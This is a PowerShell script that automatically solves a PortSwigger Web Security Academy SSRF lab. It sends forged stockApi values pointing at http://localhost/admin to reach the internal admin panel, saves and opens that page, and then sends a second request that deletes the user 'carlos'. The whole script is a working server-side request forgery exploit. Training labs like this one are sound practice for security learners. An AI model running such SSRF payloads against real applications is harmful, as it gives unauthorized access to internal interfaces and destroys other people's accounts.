# Automated solution for https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

$LabURL = Read-Host -Prompt "Enter the lab URL (e.g., https://example.web-security-academy.net): "

# Remove whitespaces and trailing slashes
$LabURL = $LabURL.Trim() -replace '/$', ''

$Response = Invoke-WebRequest -UseBasicParsing -Uri "$LabURL/product/stock" `
  -Method "POST" `
  -Headers @{
  "accept-encoding" = "gzip, deflate, br"
} `
  -ContentType "application/x-www-form-urlencoded" `
  -Body "stockApi=http%3A%2F%2Flocalhost%2Fadmin"

$Content = $Response | Select-Object -Expand Content
# Print the contents
# $Content

# Preparing the content to be opened with browser by switching relative paths to absolute paths
# Replace href="/ with href="https://example.web-security-academy.net/
$Content = $Content -replace 'href="/', "href=`"$LabURL/"
# Replace href=/ with href=https://example.web-security-academy.net/
$Content = $Content -replace 'href=/', "href=$LabURL/"
# Replace src="/ with src="https://example.web-security-academy.net/
$Content = $Content -replace 'src="/', "src=`"$LabURL/"

# Save the contents
$OutputFilePath = Join-Path -Path $PWD -ChildPath "admin.html"
$Content | Set-Content -Path $OutputFilePath

# Open the HTML content in Microsoft Edge
Start-Process "msedge" -ArgumentList "file:///$OutputFilePath"

# Delete carlos
$Response = Invoke-WebRequest -UseBasicParsing -Uri "$LabURL/product/stock" `
  -Method "POST" `
  -Headers @{
  "accept-encoding" = "gzip, deflate, br"
} `
  -ContentType "application/x-www-form-urlencoded" `
  -Body "stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos"

$Content = $Response | Select-Object -Expand Content

if ($Content -match "Congratulations") {
  Write-Host "Done! (don't mind the error)"
}
